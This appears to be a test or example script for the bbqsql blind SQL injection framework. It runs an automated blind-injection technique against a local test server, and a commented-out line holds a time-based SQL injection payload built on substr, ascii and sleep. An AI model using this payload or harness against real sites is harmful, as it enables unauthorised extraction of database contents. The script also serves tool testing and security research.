import bbqsql
import requests
from time import time
from urllib import quote


def my_sender(request):
    #we need a single function that can send requests
    if request.send():
        return request.response
    else:
        raise 

def pre_hook(request):
    #hooks for the requests module
    request.start_time = time()
    return request

def post_hook(request):
    #hooks for the requests module
    request.response.response_time = time() - request.start_time
    request.response.size = len(request.response.content)
    return request

#url = bbqsql.Query('http://127.0.0.1/vulnerable_server.php?query=${query}',encoder=quote)
#query = bbqsql.Query("hello' or if(ascii(substr((${user_query:SELECT 'A'} LIMIT 1 OFFSET ${row_index:0}), ${char_index:1}, 1))${comparator:=}${char_val:65},sleep(${sleep:1}),1)=0 or 'a'='b")

url = bbqsql.Query('http://127.0.0.1:1337/?${query}')
query = bbqsql.Query("foo=${user_query:unimportant}&row_index=${row_index:1}&char_index=${char_index:0}&test_char=${char_val:0}&cmp=${comparator:>}&sleep=${sleep:0}",encoder=quote)

#build a requests.Session object to hold settings
session = requests.Session()

#build a request object (but don't send it)
request = session.get(url,return_response=False,hooks = {'pre_request':pre_hook,'post_request':post_hook})

#build a bbqsql.Requester object 
requester = bbqsql.Requester(request = request, send_request_function = my_sender)

mytruth = bbqsql.LooseTextTruth(comparison_attr = "content", acceptable_deviation = .6)

tech = bbqsql.BlindTechnique(make_request_func=requester.make_request,query=query,concurrency=1, truth=mytruth)
results = tech.run('unimportant',sleep=0)

print results

